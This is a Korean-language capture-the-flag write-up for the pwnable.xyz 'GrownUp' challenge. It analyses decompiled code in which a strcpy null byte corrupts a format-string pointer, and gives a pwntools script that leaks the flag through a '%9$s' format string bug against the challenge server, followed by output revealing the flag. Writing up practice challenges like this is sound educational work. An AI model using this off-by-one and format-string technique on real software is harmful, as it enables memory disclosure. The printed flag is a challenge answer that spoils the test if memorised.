# [pwnable.xyz] GrownUp

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Are you old enough for this one? Flag is in the binary itself.
>
> Release: [GrownUp.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8933147/GrownUp.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/174427876-cd414479-3e83-40b6-ae65-42655329775d.png)

## Analysis

### flag

![image](https://user-images.githubusercontent.com/104156058/174465663-8818690b-dbe1-4f9b-9fa1-80b5bdb3436e.png)

`0x601080`에 플래그가 있다.

### setup()

```c
unsigned int setup()
{
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  signal(14, handler);
  qword_601160 = &byte_601168;
  byte_601168 = '%';
  byte_601169 = 's';
  byte_60116A = '\n';
  return alarm(0x3Cu);
}
```

`0x601160`에는 `0x601168`이 들어가고, `0x601168`에는 포맷 스트링 `"%s\n"`가 들어간다.

### main()

```c
  printf("Are you 18 years or older? [y/N]: ");
  *((_BYTE *)buf + (int)(read(0, buf, 0x10uLL) - 1)) = 0;
  if ( LOBYTE(buf[0]) != 'y' && LOBYTE(buf[0]) != 'Y' )
    return 0;
```

18세 이상인지 물어보는데, 대답이 `'y'` 또는 `'Y'`가 아니면 함수를 종료한다.

```c
  name = (char *)malloc(0x84uLL);
  printf("Name: ");
  read(0, name, 0x80uLL);
  strcpy(usr, name);
  printf("Welcome ");
  printf(qword_601160, usr);
```

`0x80`바이트 길이의 `name`을 입력받고, `strcpy()`로 `usr`(`0x6010e0`)에 복사한다.

## Exploit

`strcpy()`는 복사된 문자열의 맨 끝에 `'\x00'`을 붙인다. `name`에 `0x80`바이트를 가득 채우면 `usr`에 `0x80`바이트가 복사되고, 맨 끝인 `0x601160`에 `'\x00'`이 들어가게 된다.

`0x601160`에는 원래 포맷 스트링으로 사용되는 문자열의 주소(`0x601168`)가 있는데, `strcpy()`가 마지막 1바이트를 `'\x00'`으로 덮어서 이 주소에 있는 값이 `0x601100`으로 바뀌게 된다. 결과적으로, 마지막에 `printf(0x601100, usr)`를 실행하는데, `0x601100`은 `usr`의 범위 안이므로 원하는 문자열을 쓸 수 있고, 따라서 FSB가 발생한다.

나이가 18세 이상인지 물어볼 때 대답으로 `0x10`바이트의 문자열을 입력할 수 있는데, 첫 글자만 `'y'` 또는 `'Y'`이면 된다. 이때 스택에 플래그의 주소를 넣어둘 수 있다. 그리고 나서 `"%s"` 포맷 스트링으로 플래그의 내용을 출력하면 된다.

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/GrownUpRedist')
else:
    r = remote('svc.pwnable.xyz', 30004)

flag = 0x601080

r.sendafter('Are you 18 years or older? [y/N]: ', b'y' * 8 + p64(flag))

payload = 'a' * 0x20
payload += '%9$s'
payload = payload.ljust(0x80, 'a')

r.sendafter('Name: ', payload)

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to svc.pwnable.xyz on port 30004: Done
[*] Switching to interactive mode
Welcome FLAG{should_have_named_it_babyfsb}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```